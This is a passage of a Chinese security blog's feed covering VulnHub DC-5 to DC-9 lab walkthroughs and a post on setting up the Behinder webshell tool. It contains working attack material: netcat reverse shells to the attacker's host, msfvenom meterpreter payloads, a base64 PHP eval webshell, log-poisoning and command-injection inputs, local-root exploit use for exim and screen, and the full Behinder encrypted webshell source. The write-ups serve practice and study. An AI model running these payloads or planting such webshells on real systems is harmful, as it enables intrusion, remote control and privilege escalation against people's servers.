bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>提权成功，然后就是取拿flag了</p><p><img src="/2022/04/30/DC-9/16.png" alt="img"></p><p>ALL CLEAR!!!!</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DC系列到处就结束了，从中学到了很多的思路，流程什么的，收获很多，后面对学到的东西做个总结啥的，方便以后使用。</span><br><span class="line">本次的ssh锁可以说是本次的一个大收获呢，就这样把。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-8</title>
      <link href="/2022/04/29/DC-8/"/>
      <url>/2022/04/29/DC-8/</url>
      
        <content type="html"><![CDATA[<p>渗透环境DC-8：<a href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.136</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.136</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-8/1.png" alt="img"></p><p>目标开启了80，22端口<br>访问目标的网页</p><p><img src="/2022/04/29/DC-8/2.png" alt="img"></p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>不要对user页面进行爆破，会被ban掉的！！！<br>逛逛有没有什么注入点啥的，<br>发现存在sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.136/?nid=3</span><br></pre></td></tr></table></figure><p>我们用sqlmap进行一个爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.168.136/?nid=1 --current-db //当前数据库的名称</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -tables -D d7db  //当前数据库的表名</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -columns -T <span class="built_in">users</span> -D d7db  //users表下的列名</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -C <span class="string">&quot;name,pass&quot;</span> -T <span class="built_in">users</span> -D d7db --dump  //users表下的name与pass的内容</span><br></pre></td></tr></table></figure><p>这里我们用john进行hash破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john ./hash.txt //hash文件里放我们的hash值</span><br></pre></td></tr></table></figure><p>最后发现只有john的密码能出来</p><p><img src="/2022/04/29/DC-8/3.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：john</span><br><span class="line">密码：turtle</span><br></pre></td></tr></table></figure><p>登录后台，这个有点向DC-7的方式进行<br>我们这里选择进行一个监听<br>这里用的是msf<br>攻击机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp //payload根据实际环境选择</span><br><span class="line"><span class="built_in">set</span> lhost IP //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.136 LPORT=2222 -f raw &gt; shell.php //生成的php，将代码复制到以下图片中，LHOST为攻击机IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-8/4.png" alt="img"></p><p>选择保存<br>再攻击机上run<br>然后在该页面进行请求</p><p><img src="/2022/04/29/DC-8/5.png" alt="img"></p><p>这是我们的msf就能连接上了</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先是一些常规操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>最后找到了一个exim4的软件</p><p><img src="/2022/04/29/DC-8/6.png" alt="img"></p><p>查看对应的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-8/7.png" alt="img"></p><p>查是否存在可利用漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim 4.8</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-8/8.png" alt="img"></p><p>这里我们将第二个脚本上到目标的&#x2F;tmp目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload ./46996.sh /tmp //上传</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">shell</span><br><span class="line"><span class="built_in">chmod</span> 4777 ./46996.sh</span><br><span class="line">./46996.sh -m netcat //命令来源，源代码有写的，可以看看</span><br></pre></td></tr></table></figure><p>执行完后我们就是root了</p><p><img src="/2022/04/29/DC-8/9.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-8/10.png" alt="img"></p><p>DC-8 clear</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-7</title>
      <link href="/2022/04/29/DC-7/"/>
      <url>/2022/04/29/DC-7/</url>
      
        <content type="html"><![CDATA[<p>渗透环境DC-7：<a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.135</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.135</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-7/1.png" alt="img"></p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>目标开启了22，80端口，先是访问80端口<br>cms为drupal<br>这里看到一个登录框</p><p><img src="/2022/04/29/DC-7/2.png" alt="img"></p><p>对admin进行弱命令爆破，失败<br>主页有这么的一个提示</p><p><img src="/2022/04/29/DC-7/3.png" alt="img"></p><p>突破口不在当前box中，我是想不到了，后来看别人的wp可算是明白了，原来突破口是这个</p><p><img src="/2022/04/29/DC-7/4.png" alt="img"></p><p>百度这个内容，可以找到一个github账号</p><p><img src="/2022/04/29/DC-7/5.png" alt="img"></p><p>看看有什么可用信息，在config.php文件中看到了账号密码</p><p><img src="/2022/04/29/DC-7/6.png" alt="img"></p><p>这个账号不是后台的，是主机的登录账号和密码，用xshell连接</p><p>登录后看到有new mail</p><p><img src="/2022/04/29/DC-7/7.png" alt="img"></p><p>看看mbox的内容</p><p>我们可以看到每隔一段时间，就会由root执行 &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p><p><img src="/2022/04/29/DC-7/8.png" alt="img"></p><p>看看能不能往那个文件有什么内容，写点东西进去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure><h3 id="drush修改密码"><a href="#drush修改密码" class="headerlink" title="drush修改密码"></a>drush修改密码</h3><p><img src="/2022/04/29/DC-7/9.png" alt="img"></p><p>这里看到有drush和gpg命令<br>gpg主要是用来进行数字签名的操作<br>drush发现可以修改账号的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-7/10.png" alt="img"></p><p>这能是root用户和www-data进行修改<br>显示改后台admin的密码看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">drush user-password admin --password=<span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-7/11.png" alt="img"></p><p>后台登录</p><p><img src="/2022/04/29/DC-7/12.png" alt="img"></p><h3 id="存在可利用插件"><a href="#存在可利用插件" class="headerlink" title="存在可利用插件"></a>存在可利用插件</h3><p>这里可以添加模板，我们添加php模板，这样我们就可以发布php模板的帖子<br>下载地址：<a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p><p><img src="/2022/04/29/DC-7/13.png" alt="img"></p><p>安装完后勾选php</p><p><img src="/2022/04/29/DC-7/14.png" alt="img"></p><p>content-&gt;add content-&gt;basic page<br>写入一句话木马，蚁剑连接</p><p><img src="/2022/04/29/DC-7/15.png" alt="img"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>往&#x2F;opt&#x2F;scripts&#x2F;backups.sh写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.168.128 1111 -e /bin/bash </span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/DC-7/16.png" alt="img"></p><p>在kali上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1111</span><br></pre></td></tr></table></figure><p>等待一段时间后就会上线了</p><p><img src="/2022/04/29/DC-7/17.png" alt="img"></p><p>获得flag</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">心得：这次的这个社工操作是真的没想到欸，也算是一次体验吧</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Behinder冰蝎</title>
      <link href="/2022/04/28/Behinder/"/>
      <url>/2022/04/28/Behinder/</url>
      
        <content type="html"><![CDATA[<p>最近尝试使用冰蝎这个工具，期间踩了很多坑，这里记录一下<br>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p><p><img src="/2022/04/28/Behinder/1.png" alt="img"></p><p>这里我们选择zip下载，然后解压，<br>这里出现第一个坑：<br>大家可能会只装了java16，因为我们的burp抓包工具，需要用java16环境，java8不行<br>但我们的冰蝎在java16下打不开，java8可以，所以我们在这里也把java8安装一下<br><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a><br>安装完后，记录好你安装的路径<br>在冰蝎目录下建议一个文件<br>Behinder_start.bat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:\Java\jdk-se8\bin //java8路径</span><br><span class="line">start javaw  -jar D:\tools\Behinder_v3.0_Beta_7\Behinder.jar //冰蝎路径</span><br></pre></td></tr></table></figure><p>然后我们运作这个bat就能打开冰蝎了</p><p><img src="/2022/04/28/Behinder/2.png" alt="img"></p><p>冰蝎不能用普通的一句话木马连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">              </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果要修改连接密码则将自己的密码进行md5加密然后取其前16位替换$key的值</p><p><img src="/2022/04/28/Behinder/3.png" alt="img"></p><p>连接成功</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用代码汇总（施工中。。。）</title>
      <link href="/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/"/>
      <url>/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a9a8804e2619fc985a759a6fe4f98947a4a4fb242fe2cdd736cb4f30b44fbfb8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 木马 </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-6</title>
      <link href="/2022/04/22/DC-6/"/>
      <url>/2022/04/22/DC-6/</url>
      
        <content type="html"><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/1.png" alt="img"></p><p>靶机ip为192.168.168.134</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/2.png" alt="img"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/4.png" alt="img"></p><p>发现wordpress后台</p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure><p>发现存在的用户</p><p><img src="/2022/04/22/DC-6/3.png" alt="img"></p><p>使用burp进行爆破，失败<br>在原文下发现提示</p><p><img src="/2022/04/22/DC-6/5.png" alt="img"></p><p>使用提示中的字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><p>爆破成功</p><p><img src="/2022/04/22/DC-6/6.png" alt="img"></p><p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>抓包修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure><p>发送<br>上传木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure><p>蚁剑连接<br>在home下发现线索</p><p><img src="/2022/04/22/DC-6/8.png" alt="img"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/9.png" alt="img"></p><p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure><p>以jens的身份执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure><p>发现当前身份变为jens</p><p><img src="/2022/04/22/DC-6/10.png" alt="img"></p><p>nmap提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/2022/04/22/DC-6/11.png" alt="img"></p><p>查看flag</p><p><img src="/2022/04/22/DC-6/12.png" alt="img"></p><p>DC-6 clear</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-5</title>
      <link href="/2022/04/17/DC-5/"/>
      <url>/2022/04/17/DC-5/</url>
      
        <content type="html"><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/1.png" alt="img"></p><p>发现目标主机为192.168.168.133</p><h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.133</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/2.png" alt="img"></p><p>开放了80端口浏览器打开</p><p><img src="/2022/04/17/DC-5/3.png" alt="img"></p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p><p><img src="/2022/04/17/DC-5/4.png" alt="img"></p><p>看看有没有存在sql注入，xss注入的可能<br>测试过，没反应<br>最后发现可以文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/5.png" alt="img"></p><p>这里用日志注入的方法getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.133/&lt;?php @assert($_POST[&#x27;test&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>查看日志文件位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/6.png" alt="img"></p><p>查看文件，用蚁剑连接</p><p><img src="/2022/04/17/DC-5/8.png" alt="img"></p><h3 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.168.128 //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.128 LPORT=4444 -f raw &gt; shell.php //生成shell</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>将shell.php通过蚁剑上传到&#x2F;tmp<br>访问对应shell.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thankyou.php?file=/tmp/shell.php</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/9.png" alt="img"></p><p>连接成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/10.png" alt="img"></p><p>有个screen-4.5.0看看有没有漏洞可用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line"><span class="built_in">cd</span> /usr/share/exploitdb/exploits/linux/local</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/11.png" alt="img"></p><p>把第一个文件通过蚁剑上传，看看能不能run<br>结果报错了<br>分析对应sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span 